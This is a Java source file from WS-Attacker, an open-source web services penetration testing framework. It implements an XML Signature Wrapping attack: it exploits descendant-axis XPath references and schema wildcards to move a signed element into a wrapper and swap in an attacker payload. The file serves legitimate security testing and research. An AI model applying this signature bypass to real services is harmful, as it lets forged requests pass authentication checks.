/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.signatureWrapping.xpath.weakness;

import java.util.*;
import javax.xml.xpath.XPathExpressionException;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import wsattacker.library.schemaanalyzer.AnyElementProperties;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.signatureWrapping.option.PayloadElement;
import wsattacker.library.signatureWrapping.option.SignedElement;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import static wsattacker.library.xmlutilities.dom.DomUtilities.domToString;
import static wsattacker.library.xmlutilities.dom.DomUtilities.getFastXPath;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.xmlutilities.namespace.NamespaceConstants;
import wsattacker.library.signatureWrapping.xpath.analysis.WrapperProperties;
import wsattacker.library.signatureWrapping.xpath.interfaces.XPathWeaknessInterface;
import wsattacker.library.signatureWrapping.xpath.parts.Step;
import wsattacker.library.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.library.signatureWrapping.xpath.weakness.util.XPathWeaknessTools;

;

/**
 * Can abuse the descendant-or-self XPath axis specifier.
 */
public class XPathDescendantWeakness implements XPathWeaknessInterface {

    private final static Logger LOG = Logger.getLogger(XPathDescendantWeakness.class);
    private final Step step;
    private int numberOfPossibilites, numberOfPostProcessPossibilites;
    private final String preXPath, postXPath;
    private final List<WrapperProperties> wrapperProperties = new ArrayList<WrapperProperties>();
    private final List<XPathWeaknessInterface> postProcessList = new ArrayList<XPathWeaknessInterface>();

    public XPathDescendantWeakness(Step descendantStep,
      SignedElement signedElement,
      PayloadElement payloadElement,
      SchemaAnalyzer schemaAnalyser)
      throws InvalidWeaknessException {
        if (!descendantStep.getAxisSpecifier().getAxisName().toFullString().startsWith("descendant")) {
            throw new InvalidWeaknessException("No descendant-* Axis");
        }
        Document doc = signedElement.getSignedElement().getOwnerDocument();
        numberOfPossibilites = 0;
        numberOfPostProcessPossibilites = 0;
        step = descendantStep;

        preXPath = step.getPreXPath();
        postXPath = step.getPostXPath();

        // Find SchemaWeaknesses to count possibilities
        List<Element> matched;
        if (!preXPath.isEmpty()) {
            try {
                matched = (List<Element>) DomUtilities.evaluateXPath(doc, preXPath);
            } catch (XPathExpressionException e) {
                LOG.warn(String.format("PreXPath '%s' does not match any Elements!", preXPath));
                LOG.error(e.getMessage());
                return;
            }
        } else {
            // if no preXPaths exists, use root element only
            matched = new ArrayList<Element>();
            matched.add(doc.getDocumentElement());
        }
        LOG.info("init: Matched " + matched.toString());
        Set<AnyElementProperties> schemaWeaknesses;
        for (Element ele : matched) {
            schemaWeaknesses = schemaAnalyser.findExpansionPoint(ele);
            for (AnyElementProperties extension : schemaWeaknesses) {
                WrapperProperties wp = new WrapperProperties(extension, signedElement.getSignedElement());

                int factor = (wp.isWrapperNeeded() ? 1 : 2);
                if (LOG.isDebugEnabled()) {
                    LOG.debug(String.format("Parent: %s / Positions: %d / wrapper needed? %b", extension.getDocumentElement()
                      .getNodeName(), wp.getPossiblePositions(), wp.isWrapperNeeded()));
                }
                numberOfPossibilites += (factor * wp.getPossiblePositions());

                wrapperProperties.add(wp);
            }
        }
        if (numberOfPossibilites == 0) {
            throw new InvalidWeaknessException("Found no possibilities");
        }

        // Post Processes:
        // XPathAttributeWeakness
        // ///////////////////////
        for (Step cur = descendantStep; cur != null; cur = cur.getNextStep()) {
            XPathWeaknessInterface aw;
            try {
                aw = new XPathAttributeWeaknessPostProcess(cur);
            } catch (InvalidWeaknessException e) {
                continue;
            }
            postProcessList.add(aw);
            numberOfPostProcessPossibilites += aw.getNumberOfPossibilities();
        }
    }

    @Override
    public int getNumberOfPossibilities() {
        return numberOfPostProcessPossibilites > 0 ? numberOfPossibilites * numberOfPostProcessPossibilites : numberOfPossibilites;
    }

    public String getPreXPath() {
        return preXPath;
    }

    public String getPostXPath() {
        return postXPath;
    }

    public List<XPathWeaknessInterface> getPostProcessList() {
        return postProcessList;
    }

    public List<WrapperProperties> getWrapperProperties() {
        return wrapperProperties;
    }

    @Override
    public void abuseWeakness(int index,
      SignedElement signedElement,
      PayloadElement payloadElement)
      throws InvalidWeaknessException {
        int originalindex = index;
        if (index >= getNumberOfPossibilities()) {
            String warn = String.format("Index >= numberOfPossibilites (%d >= %d)", index, getNumberOfPossibilities());
            LOG.warn(warn);
            throw new InvalidWeaknessException(warn);
        }

        // detect postProcess to use
        int postProcessListIndex = -1;
        int postProcessAbuseIndex = 0;
        for (XPathWeaknessInterface aw : postProcessList) {
            ++postProcessListIndex;
            if (index > numberOfPossibilites * aw.getNumberOfPossibilities()) {
                index -= numberOfPossibilites * aw.getNumberOfPossibilities();
            } else {
                while (index >= numberOfPossibilites) {
                    index -= numberOfPossibilites;
                    ++postProcessAbuseIndex;
                }
                break;
            }
        }

        boolean useRealWrapper = true;
        int wrapperPropertiesIndex = -1;
        int childIndex = -1;
        for (int i = 0; i < wrapperProperties.size(); ++i) {
            WrapperProperties wp = wrapperProperties.get(i);
            if (index < wp.getPossiblePositions()) {
                childIndex = index;
                wrapperPropertiesIndex = i;
                break;
            }
            if (!wp.isWrapperNeeded()) {
                index -= wp.getPossiblePositions();
                if (index < wp.getPossiblePositions()) {
                    childIndex = index;
                    useRealWrapper = false;
                    wrapperPropertiesIndex = i;
                    break;
                }
            }
            index -= wp.getPossiblePositions();
        }
        if (LOG.isDebugEnabled()) {
            LOG.trace(String
              .format("abuseWeakness #%d => wpi=%d, child=%d, realWrapper=%b, postIndex=%d, postIndexAbuse=%d", originalindex, wrapperPropertiesIndex, childIndex, useRealWrapper, postProcessListIndex, postProcessAbuseIndex));
        }
        abuseWeakness(wrapperPropertiesIndex, childIndex, useRealWrapper, postProcessListIndex, postProcessAbuseIndex, signedElement, payloadElement);
    }

    protected void abuseWeakness(int wrapperPropertiesIndex,
      int childIndex,
      boolean useRealWrapper,
      int postProcessListIndex,
      int postProcessAbuseIndex,
      SignedElement sig,
      PayloadElement pay)
      throws InvalidWeaknessException {
        Element signedElement = sig.getSignedElement();
        Element payloadElement = pay.getPayloadElement();
        // Get the Elements matched by the postXPath
        // as those are part of the hashed sub-tree
        // //////////////////////////////////////////

        // Detection by PostXPath
//    Element signedPostPart = XPathWeaknessTools.detectHashedPostTree(signedElement, postXPath);
        // with getSignedPostPart method by exteded PreXPath
        List<Element> signedPostPartList = XPathWeaknessTools.getSignedPostPart(step.getNextStep(), signedElement);
        // This should never happen
        if (signedPostPartList.size() != 1) {
            throw new InvalidWeaknessException();
        }
        Element signedPostPart = signedPostPartList.get(0);

        // TODO: This does not work
//    if (signedPostPart.getParentNode() == null)
//    {
//      String warn = "Whole Document signed. No Wrapping Attack possible.";
//      log.warn(warn);
//      throw new InvalidWeaknessException(warn);
//    }
        if (LOG.isDebugEnabled()) {
            LOG.debug("Detected signedPostPart:\n" + getFastXPath(signedPostPart));
        }
        // TODO: Now trying with replaceChild()
//    Element signedPostPartParent = (Element) signedPostPart.getParentNode();
//    if (log.isDebugEnabled()) {
//				  log.debug("Detected signedPostPartParent:\n" + getFastXPath(signedPostPartParent));
//		  }

        // Now place the Payload
        // ////////////////////////////////////////////////////
        Element payloadPostPart = XPathWeaknessTools.createPayloadPostPart(signedPostPart, signedElement, payloadElement);
        if (LOG.isDebugEnabled()) {
            LOG.debug("Created payloadPostPart: \n" + domToString(payloadPostPart, true));
        }
//    signedPostPartParent.insertBefore(payloadPostPart, signedPostPart);
        if (pay.useThisPayloadElement()) {
            // Normal Case:
            signedPostPart.getParentNode().replaceChild(payloadPostPart, signedPostPart);
        } else {
            // Case: Wrap only without payload
            Node copy = signedPostPart.cloneNode(true);
            signedPostPart.getParentNode().replaceChild(copy, signedPostPart);
            WeaknessLog.append(String.format("Do not place Payload '%s', Wrapping Only!", payloadElement.getNodeName()));
        }

        // Which Schema-Weakness to abuse:
        // ////////////////////////////////
        WrapperProperties wrapperProperty = wrapperProperties.get(wrapperPropertiesIndex);
        AnyElementProperties anyElementProperties = wrapperProperty.getAnyElementPorperties();

        // The parent of the wrapper to place
        Element wrapperParent = DomUtilities
          .findCorrespondingElement(signedElement.getOwnerDocument(), anyElementProperties.getDocumentElement());

        // the concrete wrapper element, can be the same as the parent!
        Element wrapper;
        // Do we use a ns1:wrapper Element or just use the signed Element?
        // ////////////////////////////////////////////////////////////////
        if (useRealWrapper) {
            LOG.trace("Surrounding singnedPostPart with real Wrapper Element!");
            // TODO: Use a random Wrapper Name
            wrapper = wrapperParent.getOwnerDocument()
              .createElementNS(NamespaceConstants.URI_NS_WSATTACKER, NamespaceConstants.PREFIX_NS_WSATTACKER + ":wrapper");
            wrapper.appendChild(signedPostPart);
        } else {
            wrapper = signedPostPart;
        }
        // Handle "strict" namspace-case
        // If processContents="strict" append soapenv:Header>ns:Wrapper
        if (anyElementProperties.getProcessContentsAttribute().equals("##strict")) {
            // Create a fake soap:Header element, as the XML Schema for this must be known
            Element env = wrapper.getOwnerDocument().getDocumentElement();
            Element tmp = env.getOwnerDocument().createElementNS(env.getNamespaceURI(), env.getPrefix() + ":Header");
            tmp.appendChild(wrapper);
            wrapper = tmp;
        }

        // At which Position?
        // ///////////////////
        List<Element> children = DomUtilities.getAllChildElements(wrapperParent);
        if (childIndex < children.size()) {
            if (LOG.isDebugEnabled()) {
                LOG.trace("Inserting Wrapper " + wrapper.getNodeName() + " before " + children.get(childIndex).getNodeName() + " Element as a child of " + wrapperParent
                  .getNodeName());
            }
            wrapperParent.insertBefore(wrapper, children.get(childIndex));
        } else {
            if (LOG.isDebugEnabled()) {
                LOG.trace("Appending Wrapper on " + wrapperParent.getNodeName());
            }
            wrapperParent.appendChild(wrapper);
        }

        // Post Process
        // /////////////
        WeaknessLog.append(String.format("Wrapper @ %s", DomUtilities.getFastXPath(signedElement)));
        if (postProcessListIndex >= 0) {
            postProcessList.get(postProcessListIndex).abuseWeakness(postProcessAbuseIndex, sig, pay);
        }

    }
}
